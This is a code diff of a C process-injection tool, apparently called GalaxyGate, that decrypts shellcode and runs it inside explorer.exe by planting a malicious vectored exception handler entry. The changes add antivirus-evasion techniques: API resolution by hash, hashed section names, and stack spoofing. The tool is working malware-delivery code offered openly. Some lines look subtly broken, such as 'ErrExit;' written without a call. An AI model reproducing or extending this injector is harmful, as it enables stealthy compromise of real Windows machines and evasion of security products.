@@ -1,5 +1,6 @@
 ﻿#include "VEHinj.h"
 #include "shellcode.h"
+
 // GalaxyGate 自研栈欺骗方案 Stack Spoof Solution
 LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo);
 NTSTATUS SFNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
@@ -26,13 +27,14 @@ void PrintDbgA(char* message);
 void PrintDbgW(wchar_t* message);
 void ErrExit();
 
-FORCEINLINE VOID SFRtlInitUnicodeString( // 使用自定义wcslen的RtlInitUnicodeString宏 其余一致
+FORCEINLINE VOID SFRtlInitUnicodeString( // 使用自定义wcslen的RtlInitUnicodeString 其余一致
 	_Out_ PUNICODE_STRING DestinationString,
 	_In_opt_z_ PCWSTR SourceString
 )
 {
-	if (SourceString)
-		DestinationString->MaximumLength = (DestinationString->Length = (USHORT)(SFwcslen(SourceString) * sizeof(WCHAR))) + sizeof(UNICODE_NULL);
+	if (SourceString) {
+		DestinationString->MaximumLength = (DestinationString->Length = (USHORT)(RtlLengthUnicodeString(SourceString) * sizeof(WCHAR))) + sizeof(UNICODE_NULL);
+	}
 	else
 		DestinationString->MaximumLength = DestinationString->Length = 0;
 	DestinationString->Buffer = (PWCH)SourceString;
@@ -44,7 +46,7 @@ FORCEINLINE VOID SFRtlInitAnsiString( // 与上个函数同理
 )
 {
 	if (SourceString)
-		DestinationString->MaximumLength = (DestinationString->Length = (USHORT)SFstrlen(SourceString)) + sizeof(ANSI_NULL);
+		DestinationString->MaximumLength = (DestinationString->Length = (USHORT)RtlLengthString(SourceString)) + sizeof(ANSI_NULL);
 	else
 		DestinationString->MaximumLength = DestinationString->Length = 0;
 
@@ -54,7 +56,9 @@ FORCEINLINE VOID SFRtlInitAnsiString( // 与上个函数同理
 void InjectorEntry() {
 	PrintDbgW(L"[!] 处于调试模式 可能降低免杀效果! | Currently in DEBUG mode, AV evasion effectiveness may be affected!\n");
 	NTSTATUS status;
-	PVOID VEH = AddVectoredExceptionHandler(1, ExceptionHandler); // GalaxyGate VEH
+	typedef PVOID(NTAPI* pRtlAddVectoredExceptionHandler)(ULONG First, PVECTORED_EXCEPTION_HANDLER Handler);
+	pRtlAddVectoredExceptionHandler SFRtlAddVectoredExceptionHandler = (pRtlAddVectoredExceptionHandler)SW3_GetSyscallAddress(0x3b9da1b1);
+	PVOID VEH = SFRtlAddVectoredExceptionHandler(1, ExceptionHandler); // GalaxyGate VEH
 	DWORD ProcessPid = ConvertProcNameToPid(L"plor"); // 即explorer
 	if (ProcessPid == 0) {
 		PrintDbgW(L"[-] 未找到目标进程 | Target process not found\n");
@@ -79,13 +83,13 @@ void InjectorEntry() {
 	PrintDbgW(L"[+] Shellcode解密完成 | Shellcode decryption completed\n");
 	DWORD mrdataSize;
 	PVOID mrdataVa;
-	if (!GetNtdllSectionVa(".mrdata", &mrdataVa, &mrdataSize)) {
+	if (!GetNtdllSectionVa(0xd23c2e62, &mrdataVa, &mrdataSize)) { // 0xd23c2e62 = .mrdata
 		PrintDbgW(L"[-] 获取NtDLL .mrdata段失败");
 		ErrExit();
 	}
 	DWORD dataSize;
 	PVOID dataVa;
-	if (!GetNtdllSectionVa(".data", &dataVa, &dataSize)) {
+	if (!GetNtdllSectionVa(0xd3bc39b6, &dataVa, &dataSize)) { // 0xd3bc39b6 = .data
 		PrintDbgW(L"[-] 获取NtDLL .data段失败");
 		ErrExit();
 	}
@@ -121,12 +125,15 @@ void InjectorEntry() {
 
 	// 编码Shellcode指针
 	PVOID encodedShellcodePointer = NULL;
-	if(!SFRtlEncodeRemotePointer(hProcess, shellcodeAddress, &encodedShellcodePointer)) {
+	typedef NTSTATUS(NTAPI* pRtlEncodeRemotePointer)(HANDLE ProcessHandle, PVOID Pointer, PVOID* EncodedPointer);
+	pRtlEncodeRemotePointer SFRtlEncodeRemotePointer = (pRtlEncodeRemotePointer)SW3_GetSyscallAddress(0x29a2393d);
+	SFRtlEncodeRemotePointer(hProcess, shellcodeAddress, &encodedShellcodePointer);
+	if (!encodedShellcodePointer) {
 		PrintDbgW(L"[-] 编码Shellcode指针失败 | Failed to encode shellcode pointer\n");
 		ErrExit;
-		ErrExit;
 	}
-
+	PrintDbgW(L"[+] 编码Shellcode指针成功 | Successfully encoded shellcode pointer\n");
+	ErrExit;
 	// 让注入的VEH指向Shellcode
 	PVECTXCPT_CALLOUT_ENTRY maliciousHandler = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(VECTXCPT_CALLOUT_ENTRY));
 	maliciousHandler->VectoredHandler = encodedShellcodePointer;
